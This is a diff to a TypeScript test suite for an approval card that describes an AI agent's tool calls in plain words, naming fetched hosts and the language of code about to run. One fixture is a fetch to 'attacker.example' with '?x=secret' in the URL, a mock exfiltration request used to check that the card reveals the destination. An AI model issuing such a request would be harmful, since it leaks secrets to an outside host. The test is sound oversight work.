@@ -294,7 +294,7 @@ describe('connector card: fetch, repository writes and mail', () => {
       makeCtx(),
     );
     const card = cardOf(decision);
-    expect(card.plain_what).toBe('Fetch a web page on exa?');
+    expect(card.plain_what).toBe('Fetch a web page from attacker.example?');
     expect(card.destination).toBe('https://attacker.example/p.png?x=secret');
     expect(card.destination_host).toBe('mcp.exa.ai');
     expect(card.outbound_text).toBe('url: https://attacker.example/p.png?x=secret');
@@ -548,6 +548,57 @@ describe('card copy', () => {
     expect(cardOf(decision).cannot_be_undone).toBe("Once this runs, it can't be undone.");
   });
 
+  test('the run_code card names the language and shows the exact code', async () => {
+    const code = 'import sys\nprint(sys.version)';
+    const decision = await classifyTier(
+      {
+        tool_name: 'run_code',
+        canonical_params: { language: 'python', code },
+        tool_type: 'truefoundry-system',
+        mcp_hints: {},
+      },
+      makeCtx(),
+    );
+    const card = cardOf(decision);
+    expect(card.plain_what).toBe('Run this Python code the assistant wrote?');
+    expect(card.parsed_command).toBe(code);
+  });
+
+  test('the run_code card names Node.js code', async () => {
+    const decision = await classifyTier(
+      {
+        tool_name: 'run_code',
+        canonical_params: { language: 'node', code: 'console.log(1)' },
+        tool_type: 'truefoundry-system',
+        mcp_hints: {},
+      },
+      makeCtx(),
+    );
+    expect(cardOf(decision).plain_what).toBe('Run this Node.js code the assistant wrote?');
+    expect(cardOf(decision).parsed_command).toBe('console.log(1)');
+  });
+
+  test('a run_code card without code or language keeps the plain line and shows no code', async () => {
+    const decision = await classifyTier(
+      { tool_name: 'run_code', canonical_params: {}, tool_type: 'truefoundry-system', mcp_hints: {} },
+      makeCtx(),
+    );
+    const card = cardOf(decision);
+    expect(card.plain_what).toBe('Run code the assistant wrote in the sandbox?');
+    expect(card.parsed_command).toBeNull();
+  });
+
+  test('a web_fetch card without a page address names neither the tool nor the connector', async () => {
+    const decision = await classifyTier(
+      connectorCall({ tool_name: 'web_fetch', params: { objective: 'How to change an address' } }),
+      makeCtx(),
+    );
+    const card = cardOf(decision);
+    expect(card.plain_what).toBe('Fetch a web page?');
+    expect(card.plain_what).not.toContain('web_fetch');
+    expect(card.plain_what).not.toContain('exa');
+  });
+
   test('no card sentence uses an em dash or the old cold wording', async () => {
     const mapsCall = (tool_name: string, params: Record<string, unknown>): SentinelAction => ({
       tool_name,
@@ -610,10 +661,23 @@ describe('Parallel preset tools', () => {
     );
     const card = cardOf(decision);
     expect(decision.reason).toBe('connector_outbound');
-    expect(card.plain_what).toBe('Fetch a web page on parallel-web?');
+    expect(card.plain_what).toBe('Fetch pages from www.usps.com and 1 other site?');
     expect(card.destination_host).toBe('search.parallel.ai');
     expect(card.outbound_text).toContain('urls (array): ["https://www.usps.com/manage/forward.htm"');
     expect(card.outbound_text).toContain('objective: How to change an address');
+  });
+
+  test.each([
+    [['https://www.usps.com/a'], 'Fetch a web page from www.usps.com?'],
+    [['https://www.usps.com/a', 'https://www.usps.com/b'], 'Fetch pages from www.usps.com?'],
+    [
+      ['https://www.usps.com/a', 'https://example.com/b', 'https://evil.example/c'],
+      'Fetch pages from www.usps.com and 2 other sites?',
+    ],
+    [['not a web address', 'also not one'], 'Fetch web pages?'],
+  ])('web_fetch with urls %j names every site it reaches, not only the first', async (urls, what) => {
+    const decision = await classifyTier(parallel('web_fetch', { urls, objective: 'o' }), makeCtx());
+    expect(cardOf(decision).plain_what).toBe(what);
   });
 
   test('web_search gets plain search wording', async () => {
@@ -636,7 +700,7 @@ describe('card for a call that was gated some other way', () => {
     const action = connectorCall({ tool_name: 'web_fetch', params: { url: 'https://example.com/a' } });
     const gated = approvalCardForGatedCall({ action, agent_intent: null });
     expect(gated).toEqual(cardOf(await classifyTier(action, makeCtx())));
-    expect(gated.plain_what).toBe('Fetch a web page on exa?');
+    expect(gated.plain_what).toBe('Fetch a web page from example.com?');
   });
 
   test('an unknown tool is described plainly with its arguments', () => {
